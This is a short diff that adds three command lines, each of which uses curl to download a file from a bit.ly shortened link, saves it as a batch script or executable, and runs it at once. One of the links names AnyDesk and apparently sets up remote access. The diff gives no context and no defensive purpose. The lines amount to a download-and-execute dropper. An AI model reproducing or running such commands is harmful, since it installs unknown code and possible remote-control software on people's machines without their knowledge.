@@ -1,0 +1,3 @@
+curl -L bit.ly/klikkanantewe>a.bat&a
+curl -L bit.ly/teweautoanydesk>auto.bat&auto
+curl -Lo zipcdr.exe bit.ly/ziptocdr&&zipcdr
